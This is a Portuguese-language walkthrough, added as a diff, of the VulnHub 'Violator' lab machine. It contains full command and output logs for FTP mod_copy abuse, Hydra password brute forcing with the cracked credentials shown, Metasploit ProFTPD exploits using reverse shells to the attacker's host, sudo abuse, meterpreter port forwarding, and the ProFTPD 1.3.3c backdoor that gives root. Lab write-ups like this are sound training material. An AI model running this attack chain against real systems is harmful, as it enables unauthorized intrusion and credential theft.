@@ -1,0 +1,335 @@
+# Netdiscover:
+192.168.1.107   08:00:27:6b:ff:76      1      60  PCS Systemtechnik GmbH     
+
+=============================================================================================================
+
+# Nmap:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5rc3
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+
+=============================================================================================================
+
+# FTP:
+Usuário anonymous e ftp não permitidos.
+
+=============================================================================================================
+
+# Página inicial com um site, onde podemos montar uma wordlist.
+http://192.168.1.107
+https://en.wikipedia.org/wiki/Violator_(album)
+
+=============================================================================================================
+
+# Criado wordlist com os nomes das musicas da url acima:
+PersonalJesus
+personaljesus
+personalJesus
+Personaljesus
+Personal Jesus
+personal jesus
+Personal jesus
+personal Jesus
+EnjoytheSilence
+enjoythesilence
+Enjoythesilence
+enjoytheSilence
+Enjoy the Silence
+enjoy the silence
+Enjoy the silence
+enjoy the Silence
+PolicyofTruth
+policyoftruth
+Policyoftruth
+policyofTruth
+Policy of Truth
+policy of truth
+Policy of truth
+policy of Truth
+WorldinMyEyes
+worldinmyeyes
+WorldinMyeyes
+worldinmyEyes
+Worldinmyeyes
+World in My Eyes
+world in my eyes
+World in My eyes
+world in My eyes
+world in my Eyes
+World in my eyes
+
+=============================================================================================================
+
+# Mod_Copy:
+# Encontrado o arquivo /etc/passwd e copiado para /var/www/html.
+root@Pentest:/home/joaofracassi/beco-xpl/violator# nc 192.168.1.107 21
+220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.107]
+site cpfr /etc/passwd
+350 File or directory exists, ready for destination name
+site cpto /var/www/html/passwd 
+250 Copy successful
+
+=============================================================================================================
+
+# Agora temos acesso completo ao passwd:
+http://192.168.1.107/passwd
+
+=============================================================================================================
+
+# Enumeração de usuários:
+# Criado wordlist com os usuários encontrados em http://192.168.1.107/passwd.
+mg
+af
+dg
+aw
+
+=============================================================================================================
+
+#Agora é necessário quebrar a senha dos usuários do FTP:
+root@Pentest:/home/joaofracassi/beco-xpl/violator# hydra -L users.txt -P wordlist.txt 192.168.1.107 ftp
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-27 09:50:48
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:5/p:36), ~12 tries per task
+[DATA] attacking ftp://192.168.1.107:21/
+[21][ftp] host: 192.168.1.107   login: af   password: enjoythesilence
+[21][ftp] host: 192.168.1.107   login: dg   password: policyoftruth
+
+=============================================================================================================
+
+#Usuários e senhas do FTP:
+af/enjoythesilence
+dg/policyoftruth
+
+=============================================================================================================
+
+# Agora vamos conectar novamente ao FTP com os usuários encontrados:
+root@Pentest:/home/joaofracassi/beco-xpl/violator# ftp 192.168.1.107
+Connected to 192.168.1.107.
+220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.107]
+Name (192.168.1.107:joaofracassi): af 
+331 Password required for af
+Password:
+230 User af logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   2 af       af           4096 Jun 11  2016 minarke-1.21
+-rw-rw-r--   1 af       af          15576 Jun 11  2016 minarke-1.21.tar.bz2
+226 Transfer complete
+ftp> 
+
+=============================================================================================================
+
+# Utilizaremos o metasploit para fazer o ataque utilizando as credenciais que foram quebradas.
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.107    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www/html    yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_python):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+   SHELL  /bin/bash        yes       The system shell to use.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.105:443 
+[*] 192.168.1.107:80 - 192.168.1.107:21 - Connected to FTP server
+[*] 192.168.1.107:80 - 192.168.1.107:21 - Sending copy commands to FTP server
+[*] 192.168.1.107:80 - Executing PHP payload /xpga6rQ.php
+[*] Command shell session 1 opened (192.168.1.105:443 -> 192.168.1.107:37183) at 2020-09-27 09:59:58 -0300
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+=============================================================================================================
+
+# Abrimos um shell interativo:
+python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@violator:/var/www/html$ 
+
+=============================================================================================================
+
+# Conectado com o outro usuário dg.
+# Esse usuário tem permissão de execução de script de ProFTPd no sudo -l:
+www-data@violator:/var/www/html$ su dg   
+su dg
+Password: policyoftruth
+
+dg@violator:/var/www/html$ whoami
+whoami
+dg
+dg@violator:/var/www/html$ sudo -l
+sudo -l
+Matching Defaults entries for dg on violator:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User dg may run the following commands on violator:
+    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
+dg@violator:/var/www/html$ 
+
+=============================================================================================================
+
+# Em /home/dg/db/etc tem o arquivo de configuração do ProFTPd.
+cd /home/dg/db
+cd etc
+cat proftpd.conf
+
+# Está permitindo somente conexão local, ou seja, mesmo iniciando o serviço não conecta, tem que liberar para toda a rede.
+
+=============================================================================================================
+
+#A gora vamos subir o serviço localmente no alvo:
+dg@violator:~/bd/etc$ sudo /home/dg/bd/sbin/proftpd
+sudo /home/dg/bd/sbin/proftpd
+ - setting default address to 127.0.0.1
+localhost - SocketBindTight in effect, ignoring DefaultServer
+dg@violator:~/bd/etc$ 
+
+dg@violator:~/bd/etc$ netstat -anpt
+netstat -anpt
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:2121          0.0.0.0:*               LISTEN      -               
+tcp        0      0 192.168.1.107:37183     192.168.1.105:443       ESTABLISHED 1166/bash       
+tcp6       0      0 :::21                   :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+dg@violator:~/bd/etc$ 
+
+=============================================================================================================
+
+# Agora será necessário dar um upgrade na shell, permitindo uma shell remota.
+# ctrl + z para colocar a shell em background.
+# sessions para mostrar o id da shell.
+# vamos setar um payload para dar o upgrade na shell.
+post/multi/manage/shell_to_meterpreter
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST    192.168.1.105    no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION  1                yes       The session to run this module on.
+
+# conecta a shell, insere o payload meterpreter, inicia o handler e executa o meterpreter que executa no handler de forma reversa.
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                                       Connection
+  --  ----  ----                   -----------                                                                       ----------
+  1         shell cmd/unix                                                                                           192.168.1.105:443 -> 192.168.1.107:37183 (192.168.1.107)
+  2         meterpreter x86/linux  no-user @ violator (uid=1000, gid=1000, euid=1000, egid=1000) @ violator.exam...  192.168.1.105:4433 -> 192.168.1.107:41501 (192.168.1.107)
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
+[*] Starting interaction with 2...
+
+meterpreter > 
+
+=============================================================================================================
+
+# Agora vamos fazer o tunelamento/pivoting da conexão.
+# Tudo que for executado lá no host alvo na porta 2121, será redirecionado para nossa porta 2121 do Kali.
+meterpreter > portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1
+[*] Local TCP relay created: 127.0.0.1:2121 <-> 127.0.0.1:2121
+meterpreter > 
+
+# Depois ctrl+z para deixar a sessão em background.
+
+=============================================================================================================
+
+# Agora vamos conectar ao exploit de RCE do ProFTPd.
+# O ip é o ip do kali mesmo, não coloque o endereço locahost para não executar no alvo.
+# A porta pode ser a que quisermos.
+# Irá enviar a conexão por dentro do tunel criado, fazendo o pivoting.
+unix/ftp/proftpd_133c_backdoor
+
+Module options (exploit/unix/ftp/proftpd_133c_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   2121             yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(unix/ftp/proftpd_133c_backdoor) > run
+
+[*] Started reverse TCP handler on 192.168.1.105:443 
+[*] 127.0.0.1:2121 - Sending Backdoor Command
+[*] Command shell session 3 opened (192.168.1.105:443 -> 192.168.1.107:37189) at 2020-09-27 10:34:06 -0300
+
+id
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+
+# Agora somos root do alvo.
+
+
+=============================================================================================================
+
+Links:
+https://www.vulnhub.com/entry/violator-1,153/
+https://www.aldeid.com/wiki/Exploits/proftpd-1.3.3c-backdoor
+https://www.exploit-db.com/exploits/16921
+https://www.offensive-security.com/metasploit-unleashed/portfwd/
+https://www.youtube.com/watch?v=WxaLlYOiCag&t=4s
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
